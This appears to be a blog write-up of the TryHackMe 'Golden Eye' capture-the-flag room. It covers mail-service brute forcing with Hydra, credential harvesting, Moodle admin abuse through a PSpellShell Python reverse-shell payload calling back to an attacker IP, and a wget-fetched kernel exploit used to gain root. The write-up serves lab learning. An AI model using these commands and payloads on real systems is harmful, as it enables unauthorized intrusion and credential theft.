---
clayout: ctf
title: Golden Eye
type: TryHackMe
date: 2025-09-04
level: Medium
icon: /ctf/tryhackme/golden-eye/icon-room.png
image: /ctf/tryhackme/golden-eye/icon-room.png
banner: /ctf/tryhackme/golden-eye/banner.png
description: Bond, James Bond. A guided CTF.
ctf-link: https://tryhackme.com/room/goldeneye
---

## Challenge Overview

This challenge is themed around the movie *GoldenEye* and involves exploiting a misconfigured mail system, weak credentials, and a vulnerable Moodle application. The ultimate goal is to escalate privileges and obtain the root flag.

## Enumeration

### Nmap Scan

We start with a full port scan to identify services:

```bash
nmap -sC -sV -p- -oN nmap.txt 10.10.158.90
```

**Results:**

```bash
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/unknown
55007/tcp open  pop3        Dovecot pop3d
```

**Key findings:**

* **SMTP (25/tcp):** Postfix mail server.
* **HTTP (80/tcp):** Apache web server hosting a web application.
* **POP3 (55007/tcp):** Dovecot POP3 mail service, likely used by employees.
* **SSL service (55006/tcp):** Identified as part of the Dovecot mail server.

## Web Enumeration

Visiting `http://10.10.158.90/` shows a themed landing page:

![Home Page](/ctf/tryhackme/golden-eye/home.png)

Checking the source code reveals an interesting HTML comment:

```ts
//
//Boris, make sure you update your default password. 
//My sources say MI6 may be planning to infiltrate. 
//I encoded your p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
```

This encoded string is in HTML decimal encoding. Decoding it yields:

```bash
InvincibleHack3r
```

So the credentials are: **boris : InvincibleHack3r**

The same page also hints at a login portal located at `/sev-home/`.

![Home Page](/ctf/tryhackme/golden-eye/login.png)

### Boris Login

Navigating to `/sev-home/` presents a login form. Using the credentials `boris:InvincibleHack3r` grants us access:

![Sev Home](/ctf/tryhackme/golden-eye/sev-home.png)

Inside the HTML source, we find a note:

```html
<!--
Qualified GoldenEye Network Operator Supervisors: 
Natalya
Boris
-->
```

This gives us another potential user: **natalya**.

## POP3 Bruteforce

With valid usernames and a running POP3 service, we attempt to brute force logins using Hydra.

```bash
hydra -l Boris -P /usr/share/wordlists/fasttrack.txt -f -s 55007 10.10.158.90 pop3
```

**Output:**

```bash
[55007][pop3] host: 10.10.158.90   login: Boris   password: secret1!
```

Now we can authenticate via POP3 as Boris:

```bash
USER Boris
PASS secret1!
+OK Logged in.
list
+OK 3 messages:
```

### Reading Boris’ Emails

Boris has three messages. The second one is interesting:

```bash
From: natalya@ubuntu
Boris, I can break your codes!
```

This hints that Natalya’s password might also be crackable.

### Cracking Natalya’s Account

Running Hydra again against Natalya:

```bash
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f -s 55007 10.10.158.90 pop3
```

**Output:**

```bash
[55007][pop3] host: 10.10.158.90   login: natalya   password: bird
```

Logging into her mailbox shows two messages. The second one contains critical information:

```bash
Ok Natalya, I have a new student for you. 
User creds:  
username: xenia  
password: RCP90rulez!
```

It also mentions a hidden site: `severnaya-station.com/gnocertdir`.

By editing `/etc/hosts` and pointing the target’s IP to `severnaya-station.com`, we can access the page.

## Xenia’s Account

At `http://severnaya-station.com/gnocertdir`, we discover a Moodle instance. Logging in with **xenia : RCP90rulez!** works.

![Moodle](/ctf/tryhackme/golden-eye/moodle.png)

Once inside, browsing messages reveals another account: **doak**.

![Moodle Messages](/ctf/tryhackme/golden-eye/moodle-messages.png)

## Doak’s Account

Hydra quickly finds his POP3 credentials:

```bash
hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f -s 55007 10.10.158.90 pop3
```

**Output:**

```bash
[55007][pop3] host: 10.10.158.90   login: doak   password: goat
```

Checking Doak’s mailbox, we find credentials for another account:

```text
username: dr_doak
password: 4England!
```

These work on the Moodle platform, giving us access to more restricted content.

## Dr. Doak’s Secret

Inside Doak’s Moodle files is a message to “007”, hinting at credentials hidden elsewhere:

![Moodle Messages](/ctf/tryhackme/golden-eye/moodle-messages-doak.png)

```text
Something juicy is located here: /dir007key/for-007.jpg
```

Visiting `http://severnaya-station.com/dir007key/for-007.jpg` downloads an image. Inspecting metadata with `exiftool` reveals a Base64 string:

```bash
exiftool for-007.jpg
echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
```

**Decoded password:** `xWinter1995x!`

So the Moodle admin credentials are: **admin : xWinter1995x!**

## Initial Foothold

Logged in as admin, we can abuse Moodle’s **PSpellShell** feature to execute system commands.

* Navigate to *Site administration → Server → System paths* and set the `Path to spellchecker` to python payload.

    ![System Paths](/ctf/tryhackme/golden-eye/system-paths.png)

    ```bash
    python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.14.102.54",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
    ```

* Then navigate to *Site administration → Server → Text editors → TinyMCE HTML editor* and set the **Spell engine** to `PSpellShell`.

    ![PSpellShell](/ctf/tryhackme/golden-eye/spellshell.png)

* Set the **Listener** to the following:

    ```bash
    nc -lvnp 4444
    ```

Once triggered via a blog post, we receive a reverse shell as **www-data**.

```bash
uid=33(www-data) gid=33(www-data)
```

## Privilege Escalation (www-data → root)

### Kernel Enumeration

```bash
uname -a
```

```bash
Linux ubuntu 3.13.0-32-generic
```

This kernel version is vulnerable to a published privilege escalation exploit ([ExploitDB 37292](https://www.exploit-db.com/exploits/37292)).

### Exploiting the Kernel

We transfer and compile the exploit:

```bash
wget http://10.14.102.54:8000/37292.c
cc 37292.c -o exploit
./exploit
```

> [!TIP] Compiling with cc instead of gcc
> Since the `gcc` command is not available, we use `cc` instead. We also need to modify the exploit to use `cc` instead of `gcc`.
>
> ```c:line-numbers=116
> lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
> write(lib,LIB,strlen(LIB));
> close(lib);
> lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w"); // [!code --]
> lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w"); // [!code ++]
> if(lib != 0) {
>     fprintf(stderr,"couldn't create dynamic library\n");
>     exit(-1);
> }
> ```
>
Execution spawns a root shell:

```bash
uid=0(root) gid=0(root)
```

With full system compromise, we retrieve the final flag.

> [!IMPORTANT] Root flag
> `/root/.flag.txt`

![Flag](/ctf/tryhackme/golden-eye/xvf7-flag.png)
